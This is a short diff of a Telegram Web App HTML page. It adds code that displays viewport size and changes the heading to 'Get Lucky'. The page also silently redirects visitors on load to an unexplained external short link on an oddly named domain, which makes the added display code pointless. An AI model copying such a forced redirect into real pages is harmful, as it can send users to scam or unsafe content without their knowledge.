@@ -2,8 +2,18 @@
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script>
     Telegram.WebApp.ready();
+    function setViewportData() {
+            var sizeEl = document.getElementById('viewport-params-size');
+            sizeEl.innerText = 'width: ' + window.innerWidth + ' x ' + 
+                'height: ' + Telegram.WebApp.viewportStableHeight;
+
+            var expandEl = document.querySelector('#viewport-params-expand');
+            expandEl.innerText = 'Is Expanded: ' + (Telegram.WebApp.isExpanded ? 'true' : 'false');
+    }
+    setViewportData();
+    Telegram.WebApp.onEvent('viewportChanged', setViewportData);
     window.location = "https://bestboooooms.com/bPhdL8"
   </script>
   
  
-  <h1>Web view 2</></html>
+  <h1>Get Lucky</></html>
